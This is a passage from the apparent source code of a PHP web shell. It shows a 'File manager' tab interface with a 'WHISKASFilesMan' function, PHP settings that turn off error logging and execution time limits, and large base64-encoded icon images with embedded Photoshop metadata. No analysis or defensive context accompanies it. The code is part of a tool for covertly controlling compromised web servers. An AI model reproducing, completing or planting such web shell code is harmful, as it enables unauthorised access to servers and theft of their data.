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"> <span>File manager</span></div><div style="display:inline-block;" id="filesman_tabs_child"></div><div id="filesman_new_tab" class="filesman_tab" style="background: linear-gradient(to bottom, #c60000 0, #ff0000 55%, #8a0000 100%);" onClick="WHISKASFilesManNewTab(c_,\'/\',1);">New Tab +</div></div>';}else{
@error_reporting(E_ALL ^ E_NOTICE);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('magic_quotes_runtime', 0);
@set_time_limit(0);
}}

function showAnimation($name){
	return '-webkit-animation: '.$name.' 800ms ease-in-out forwards;-moz-animation: '.$name.' 800ms ease-in-out forwards;-ms-animation: '.$name.' 800ms ease-in-out forwards;animation: '.$name.' 800ms ease-in-out forwards;';
}
function __showicon($r){
	$s['btn']='data:image/png;base64,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/GMzLdsAADr5aVRYdFhNTDpjb20uYWRvYmUueG1wAAAAAAA8P3hwYWNrZXQgYmVnaW49Iu+7vyIgaWQ9Ilc1TTBNcENlaGlIenJlU3pOVGN6a2M5ZCI/Pgo8eDp4bXBtZXRhIHhtbG5zOng9ImFkb2JlOm5zOm1ldGEvIiB4OnhtcHRrPSJBZG9iZSBYTVAgQ29yZSA1LjYtYzExMSA3OS4xNTgzMjUsIDIwMTUvMDkvMTAtMDE6MTA6MjAgICAgICAgICI+CiAgIDxyZGY6UkRGIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyI+CiAgICAgIDxyZGY6RGVzY3JpcHRpb24gcmRmOmFib3V0PSIiCiAgICAgICAgICAgIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIKICAgICAgICAgICAgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iCiAgICAgICAgICAgIHhtbG5zOnN0RXZ0PSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VFdmVudCMiCiAgICAgICAgICAgIHhtbG5zOnBob3Rvc2hvcD0iaHR0cDovL25zLmFkb2JlLmNvbS9waG90b3Nob3AvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICAgICAgICAgICB4bWxuczp0aWZmPSJodHRwOi8vbnMuYWRvYmUuY29tL3RpZmYvMS4wLyIKICAgICAgICAgICAgeG1sbnM6ZXhpZj0iaHR0cDovL25zLmFkb2JlLmNvbS9leGlmLzEuMC8iPgogICAgICAgICA8eG1wOkNyZWF0b3JUb29sPkFkb2JlIFBob3Rvc2hvcCBDQyAyMDE1IChXaW5kb3dzKTwveG1wOkNyZWF0b3JUb29sPgogICAgICAgICA8eG1wOkNyZWF0ZURhdGU+MjAxNi0wOC0wN1QxNjozOTozOSswNDozMDwveG1wOkNyZWF0ZURhdGU+CiAgICAgICAgIDx4bXA6TWV0YWRhdGFEYXRlPjIwMTYtMDgtMDdUMTY6Mzk6MzkrMDQ6MzA8L3htcDpNZXRhZGF0YURhdGU+CiAgICAgICAgIDx4bXA6TW9kaWZ5RGF0ZT4yMDE2LTA4LTA3VDE2OjM5OjM5KzA0OjMwPC94bXA6TW9kaWZ5RGF0ZT4KICAgICAgICAgPHhtcE1NOkluc3RhbmNlSUQ+eG1wLmlpZDphYWVjYjE2Ni1mODAyLTJmNDYtOTgzYS1iMmFlZWRiZWY4MmE8L3htcE1NOkluc3RhbmNlSUQ+CiAgICAgICAgIDx4bXBNTTpEb2N1bWVudElEPmFkb2JlOmRvY2lkOnBob3Rvc2hvcDpjYTAyYmI4OC01Yzk3LTExZTYtOTRjOC04MTNiNzc3ODY2YWY8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDphYzgwZmZmNi0zYmQ0LTRkNGQtOTFlMi0xZTFlZTk3NDI3ZDM8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6YWM4MGZmZjYtM2JkNC00ZDRkLTkxZTItMWUxZWU5NzQyN2QzPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE2LTA4LTA3VDE2OjM5OjM5KzA0OjMwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgMjAxNSAoV2luZG93cyk8L3N0RXZ0OnNvZnR3YXJlQWdlbnQ+CiAgICAgICAgICAgICAgIDwvcmRmOmxpPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5zYXZlZDwvc3RFdnQ6YWN0aW9uPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6aW5zdGFuY2VJRD54bXAuaWlkOmFhZWNiMTY2LWY4MDItMmY0Ni05ODNhLWIyYWVlZGJlZjgyYTwvc3RFdnQ6aW5zdGFuY2VJRD4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OndoZW4+MjAxNi0wOC0wN1QxNjozOTozOSswNDozMDwvc3RFdnQ6d2hlbj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OnNvZnR3YXJlQWdlbnQ+QWRvYmUgUGhvdG9zaG9wIENDIDIwMTUgKFdpbmRvd3MpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICAgICA8c3RFdnQ6Y2hhbmdlZD4vPC9zdEV2dDpjaGFuZ2VkPgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDxwaG90b3Nob3A6RG9jdW1lbnRBbmNlc3RvcnM+CiAgICAgICAgICAgIDxyZGY6QmFnPgogICAgICAgICAgICAgICA8cmRmOmxpPnhtcC5kaWQ6M2Y1MTA4ZjMtOTU2Zi01NjQ5LTllM2YtZGViYWYwNGU0NTRlPC9yZGY6bGk+CiAgICAgICAgICAgIDwvcmRmOkJhZz4KICAgICAgICAgPC9waG90b3Nob3A6RG9jdW1lbnRBbmNlc3RvcnM+CiAgICAgICAgIDxwaG90b3Nob3A6Q29sb3JNb2RlPjM8L3Bob3Rvc2hvcDpDb2xvck1vZGU+CiAgICAgICAgIDxwaG90b3Nob3A6SUNDUHJvZmlsZT5zUkdCIElFQzYxOTY2LTIuMTwvcGhvdG9zaG9wOklDQ1Byb2ZpbGU+CiAgICAgICAgIDxkYzpmb3JtYXQ+aW1hZ2UvcG5nPC9kYzpmb3JtYXQ+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjE8L2V4aWY6Q29sb3JTcGFjZT4KICAgICAgICAgPGV4aWY6UGl4ZWxYRGltZW5zaW9uPjM4PC9leGlmOlBpeGVsWERpbWVuc2lvbj4KICAgICAgICAgPGV4aWY6UGl4ZWxZRGltZW5zaW9uPjQyPC9leGlmOlBpeGVsWURpbWVuc2lvbj4KICAgICAgPC9yZGY6RGVzY3JpcHRpb24+CiAgIDwvcmRmOlJERj4KPC94OnhtcG1ldGE+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg